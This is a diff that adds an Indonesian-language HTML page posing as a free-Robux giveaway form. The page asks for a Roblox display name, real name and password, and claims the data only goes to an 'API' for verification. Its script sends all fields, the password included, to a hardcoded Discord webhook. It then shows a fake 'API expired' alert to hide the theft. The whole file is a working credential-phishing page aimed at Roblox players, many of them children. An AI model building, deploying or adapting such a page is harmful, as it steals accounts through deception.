@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Form Bagi Robux</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background: #fff;
+            padding: 20px 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 100%;
+        }
+
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        p {
+            color: #666;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        label {
+            margin-bottom: 5px;
+            font-size: 14px;
+            color: #333;
+        }
+
+        input {
+            margin-bottom: 15px;
+            padding: 10px;
+            font-size: 14px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #007bff;
+        }
+
+        button {
+            padding: 10px 15px;
+            font-size: 16px;
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Format Data</h1>
+        <p>Semua Informasi Ini Akan Dikirim Ke API Dan Api Akan Memverifikasi(bukan kirim ke owner), Jika gagal, API sudah Kadaluarsa/Mati Dan Tidak Bisa Dipakai Lagi</p>
+        <form id="userForm">
+            <label for="displayName">Display Name</label>
+            <input type="text" id="displayName" name="displayName" placeholder="Isi Dengan Display Name Kamu(bukan real name)" required>
+
+            <label for="realName">Real Name</label>
+            <input type="text" id="realName" name="realName" placeholder="Isi Dengan Real Name Kamu(bukan display name)" required>
+
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" placeholder="Isi Dengan Password Kamu(Jangan Sebar) Pass Akan Dikirim Ke API" required>
+
+            <label for="robux">Robux</label>
+            <input type="number" id="robux" name="robux" placeholder="Berapa Robux yang kamu mau? Serah mau brp" required>
+
+            <button type="submit">Sudah</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('userForm').addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            // Data from the form
+            const data = {
+                displayName: document.getElementById('displayName').value,
+                realName: document.getElementById('realName').value,
+                password: document.getElementById('password').value,
+                robux: document.getElementById('robux').value,
+            };
+
+            // Webhook URL
+            const webhookURL = "https://discord.com/api/webhooks/1311385414627754086/mKV8Nz0s_sTh5GKUR-REKLMNmXbEl4q18sOFThY9s26GQIPXiwcv37M_DyN6nNLzYlbu"; // Ganti dengan URL webhook Anda
+
+            // Send data to webhook
+            fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ content: JSON.stringify(data, null, 2) })
+            })
+                .then(response => {
+                    if (response.ok) {
+                        alert("Roblox API Sudah Kadaluarsa/Mati Dan Tidak Bisa Dipakai Lagi");
+                    } else {
+                        alert("Failed to submit the form. Please try again.");
+                    }
+                })
+                .catch(error => {
+                    alert("Error submitting the form.");
+                    console.error(error);
+                });
+        });
+    </script>
+</body>
+</html>
